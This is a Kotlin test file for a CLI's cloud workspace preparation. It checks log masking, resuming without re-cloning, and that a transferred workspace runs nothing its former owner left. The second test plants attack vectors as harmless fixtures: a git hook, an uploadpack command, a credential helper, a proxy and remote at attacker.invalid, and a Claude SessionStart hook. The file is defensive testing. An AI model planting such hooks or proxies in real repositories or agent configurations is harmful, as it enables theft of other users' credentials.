package me.nathanfallet.teamcode.cli

import java.nio.file.Files
import kotlinx.coroutines.runBlocking
import me.nathanfallet.teamcode.api.models.*
import me.nathanfallet.teamcode.cli.cloud.*
import kotlin.io.path.*
import kotlin.test.*

/** Real `/bin/sh` and `git` against a local repository: the shell wrapper, staging clone, markers and log masking. */
class CloudPreparationProcessTest {
    private fun git(directory: java.nio.file.Path, vararg arguments: String) {
        val process = ProcessBuilder(listOf("git", "-c", "user.name=t", "-c", "user.email=t@example.test") + arguments).directory(directory.toFile()).redirectErrorStream(true).start()
        process.inputStream.readAllBytes()
        assertEquals(0, process.waitFor(), "git ${arguments.joinToString(" ")}")
    }

    /** The pod's runner: commands started like the supervisor starts them, the log kept by the agent-side writer. */
    private fun supervised(workspace: java.nio.file.Path) = SupervisedCommandRunner(workspace.toString(), { command, arguments, environment, directory ->
        me.nathanfallet.teamcode.cli.platform.startAgentProcess(command, arguments, environment, directory)
    }) {
        val file = PreparationLogFile(EnvironmentPreparation.logFile(workspace.toString(), 1))
        object : PreparationLogSink {
            override suspend fun append(line: String) = file.append(line)
            override suspend fun close() = file.close()
        }
    }

    @Test fun preparesAWorkspaceTwiceWithoutRecloning() = preparesAWorkspaceTwiceWithoutRecloning { ShellCommandRunner(EnvironmentPreparation.logFile(it.toString(), 1)) }

    @Test fun preparesAWorkspaceThroughTheSupervisor() = preparesAWorkspaceTwiceWithoutRecloning(::supervised)

    private fun preparesAWorkspaceTwiceWithoutRecloning(runner: (java.nio.file.Path) -> CommandRunner) = runBlocking {
        val root = Files.createTempDirectory("teamcode-preparation-")
        try {
            val origin = root.resolve("origin").createDirectories()
            git(origin, "init", "-q", "-b", "main"); git(origin, "commit", "-q", "--allow-empty", "-m", "one")
            git(origin, "switch", "-q", "-c", "release"); git(origin, "commit", "-q", "--allow-empty", "-m", "two"); git(origin, "switch", "-q", "main")
            val workspace = root.resolve("workspace").createDirectories()
            workspace.resolve("app").createDirectories() // An empty directory (for example a mount point) is replaced.
            val secret = "synthetic-variable-value-0123"
            val recipe = CloudEnvironmentView(listOf(CloudRepositoryView("file://$origin", "app", "release", "task-7")), "app",
                CloudSetupView(create = listOf("echo created >> ../created.txt"), start = listOf("echo \"value=\$SAMPLE_SECRET\"; pwd")))
            val prepared = RunnerEnvironmentView(recipe, RunnerGitIdentityView("Owner Name", "owner@example.test"), mapOf("SAMPLE_SECRET" to secret), emptyList(), RunnerGitHubView("not_linked"))
            val calls = object : PreparationCalls {
                val failures = mutableListOf<RunnerPreparationFailureView>()
                override suspend fun environment() = prepared
                override suspend fun progress(phase: String, failure: RunnerPreparationFailureView?): RunnerInstructionView {
                    failure?.let { failures += it }; return RunnerInstructionView("running", null, 1)
                }
            }
            // HOME points into the workspace like in the pod, so `git config --global` writes there.
            val home = mapOf("HOME" to "$workspace/.home", "GIT_CONFIG_NOSYSTEM" to "1")
            val shell = runner(workspace)
            val commands = CommandRunner { arguments, directory, environment, secrets -> shell.run(arguments, directory, environment + home, secrets) }
            fun preparation(calls: PreparationCalls) = EnvironmentPreparation(calls, commands, workspace.toString(), sleep = {}, protocols = setOf("https", "file"))
            assertTrue(preparation(calls).run(), "Failures: ${calls.failures}")
            assertTrue(workspace.resolve("app/.git").isDirectory())
            assertTrue(workspace.resolve(".home/.gitconfig").readText().contains("Owner Name"))
            val head = ProcessBuilder("git", "rev-parse", "--abbrev-ref", "HEAD").directory(workspace.resolve("app").toFile()).start().inputStream.readAllBytes().decodeToString().trim()
            assertEquals("task-7", head)
            // Work in progress survives a second preparation (a resume): fetched, never re-cloned or reset.
            workspace.resolve("app/work.txt").writeText("unsaved work")
            assertTrue(preparation(calls).run())
            assertEquals("unsaved work", workspace.resolve("app/work.txt").readText())
            assertEquals("created\n", workspace.resolve("created.txt").readText(), "Create steps run once per workspace")
            val log = Path(EnvironmentPreparation.logFile(workspace.toString(), 1)).readText()
            assertFalse(secret in log, "Variable values are masked in the preparation log")
            assertTrue("value=[REDACTED]" in log && "$workspace/app" in log)
            // A failing start command is reported with its exit code.
            val failing = RunnerEnvironmentView(recipe.copy(setup = CloudSetupView(start = listOf("exit 3"))), prepared.git, emptyMap(), emptyList(), prepared.github)
            val failed = object : PreparationCalls by calls { override suspend fun environment() = failing }
            assertFalse(preparation(failed).run())
            assertEquals(RunnerPreparationFailureView("setup_start", 0, 3), calls.failures.last())
            // Without any secret the log is still bounded.
            val chatty = RunnerEnvironmentView(recipe.copy(setup = CloudSetupView(start = listOf("head -c 6000000 /dev/zero | tr '\\0' x"))), prepared.git, emptyMap(), emptyList(), prepared.github)
            assertTrue(preparation(object : PreparationCalls by calls { override suspend fun environment() = chatty }).run())
            assertTrue(Path(EnvironmentPreparation.logFile(workspace.toString(), 1)).fileSize() <= 4L * 1024 * 1024)
        } finally { root.toFile().deleteRecursively() }
    }

    /**
     * A transferred workspace, as a former owner who wants the recipient's credentials could leave it: a settings file
     * with a hook in the agent's home, and in a repository a hook, an upload-pack command, a credential helper, a proxy
     * and an extra remote. On `main` the recipient's first preparation ran the hook and the upload-pack command with
     * the recipient's token in their environment. Now none of them runs, and none survives.
     */
    @Test fun aTransferredWorkspaceRunsNothingTheFormerOwnerLeft() = runBlocking {
        val root = Files.createTempDirectory("teamcode-transfer-")
        try {
            val origin = root.resolve("origin").createDirectories()
            git(origin, "init", "-q", "-b", "main"); git(origin, "commit", "-q", "--allow-empty", "-m", "one")
            val workspace = root.resolve("workspace").createDirectories()
            git(workspace, "clone", "-q", "file://$origin", "app")
            git(origin, "commit", "-q", "--allow-empty", "-m", "two")
            val ran = root.resolve("ran").createDirectories()
            // The former owner's payloads.
            val app = workspace.resolve("app")
            app.resolve(".git/hooks/reference-transaction").apply { writeText("#!/bin/sh\ntouch '$ran/hook'\n"); toFile().setExecutable(true) }
            git(app, "config", "remote.origin.uploadpack", "sh -c 'touch $ran/uploadpack; git-upload-pack \"\$@\"' sh")
            git(app, "config", "credential.helper", "!touch $ran/helper")
            git(app, "config", "http.https://github.com.proxy", "http://attacker.invalid:3128")
            git(app, "config", "remote.attacker.url", "https://attacker.invalid/x.git")
            git(app, "config", "branch.main.remote", "origin"); git(app, "config", "branch.main.merge", "refs/heads/main")
            val agentHome = workspace.resolve(".agent-home")
            agentHome.resolve(".claude").createDirectories().resolve("settings.json").writeText("""{"hooks":{"SessionStart":[{"hooks":[{"type":"command","command":"touch $ran/session"}]}]}}""")
            agentHome.resolve(".claude/projects/-workspace-app").createDirectories().resolve("conversation.jsonl").writeText("{}\n")
            agentHome.resolve(".codex/sessions/2026").createDirectories().resolve("rollout.jsonl").writeText("{}\n")
            agentHome.resolve(".bashrc").writeText("touch '$ran/bashrc'\n")
            agentHome.resolve(".gitconfig").writeText("[core]\n\thooksPath = $ran\n")

            val recipe = CloudEnvironmentView(listOf(CloudRepositoryView("file://$origin", "app", null, null)), "app", CloudSetupView())
            val prepared = RunnerEnvironmentView(recipe, RunnerGitIdentityView("Recipient", "recipient@example.test"), emptyMap(), emptyList(),
                RunnerGitHubView("linked", "ghu_synthetic_recipient_token", 1), untrustedWorkspace = true)
            val calls = object : PreparationCalls {
                val failures = mutableListOf<RunnerPreparationFailureView>()
                override suspend fun environment() = prepared
                override suspend fun progress(phase: String, failure: RunnerPreparationFailureView?): RunnerInstructionView {
                    failure?.let { failures += it }; return RunnerInstructionView("running", null, 1)
                }
            }
            // As in the agent's container: HOME is the agent's home on the workspace.
            val shell = supervised(workspace)
            val commands = CommandRunner { arguments, directory, environment, secrets ->
                shell.run(arguments, directory, environment + mapOf("HOME" to agentHome.toString(), "GIT_CONFIG_NOSYSTEM" to "1"), secrets)
            }
            assertTrue(EnvironmentPreparation(calls, commands, workspace.toString(), sleep = {}, protocols = setOf("https", "file"), agentHome = agentHome.toString()).run(),
                "Failures: ${calls.failures}")

            assertEquals(emptyList(), ran.listDirectoryEntries().map { it.name }, "Nothing the former owner left ran")
            val fetched = ProcessBuilder("git", "rev-list", "--count", "origin/main").directory(app.toFile()).start().inputStream.readAllBytes().decodeToString().trim()
            assertEquals("2", fetched, "The repository was still fetched")
            // The agent's home starts over with the recipient's identity, keeping only the conversation transcripts.
            assertFalse(agentHome.resolve(".claude/settings.json").exists()); assertFalse(agentHome.resolve(".bashrc").exists())
            assertTrue(agentHome.resolve(".claude/projects/-workspace-app/conversation.jsonl").exists())
            assertTrue(agentHome.resolve(".codex/sessions/2026/rollout.jsonl").exists())
            val identity = agentHome.resolve(".gitconfig").readText()
            assertTrue("Recipient" in identity && "hooksPath" !in identity, identity)
            val quarantine = workspace.resolve(".teamcode/quarantine")
            assertTrue(quarantine.resolve("agent-home/.claude/settings.json").exists(), "Moved aside, not deleted")
            // The repository's configuration is rebuilt from the recipe; the former one and its hooks are moved aside.
            val config = app.resolve(".git/config").readText()
            assertTrue("url = file://$origin" in config && "merge = refs/heads/main" in config, config)
            for (gone in listOf("uploadpack", "helper", "proxy", "attacker")) assertFalse(gone in config, "$gone in $config")
            assertFalse(app.resolve(".git/hooks").exists())
            assertTrue(quarantine.resolve("repository-0/hooks/reference-transaction").exists() && "uploadpack" in quarantine.resolve("repository-0/config").readText())
            assertFalse("ghu_synthetic_recipient_token" in Path(EnvironmentPreparation.logFile(workspace.toString(), 1)).takeIf { it.exists() }?.readText().orEmpty())

            // The recipient's own later preparation leaves the repository as their agent configures it, and still runs
            // no hook while fetching.
            app.resolve(".git/hooks").createDirectories().resolve("reference-transaction").apply { writeText("#!/bin/sh\ntouch '$ran/own-hook'\n"); toFile().setExecutable(true) }
            git(origin, "commit", "-q", "--allow-empty", "-m", "three")
            val trusted = object : PreparationCalls by calls { override suspend fun environment() =
                RunnerEnvironmentView(recipe, prepared.git, emptyMap(), emptyList(), prepared.github) }
            assertTrue(EnvironmentPreparation(trusted, commands, workspace.toString(), sleep = {}, protocols = setOf("https", "file"), agentHome = agentHome.toString()).run())
            assertEquals(emptyList(), ran.listDirectoryEntries().map { it.name })
            assertTrue(app.resolve(".git/hooks/reference-transaction").exists(), "An owner's own repository is never reset")

            // A repository whose .git is a link is refused rather than followed.
            val linked = workspace.resolve("linked").createDirectories()
            Files.createSymbolicLink(linked.resolve(".git"), app.resolve(".git"))
            val withLink = RunnerEnvironmentView(recipe.copy(repositories = listOf(CloudRepositoryView("file://$origin", "linked", null, null)), workingDirectory = "linked"),
                prepared.git, emptyMap(), emptyList(), prepared.github, untrustedWorkspace = true)
            assertFalse(EnvironmentPreparation(object : PreparationCalls by calls { override suspend fun environment() = withLink }, commands, workspace.toString(), sleep = {},
                protocols = setOf("https", "file"), agentHome = agentHome.toString()).run())
            assertEquals(RunnerPreparationFailureView("workspace", 0, 3), calls.failures.last())
        } finally { root.toFile().deleteRecursively() }
    }
}
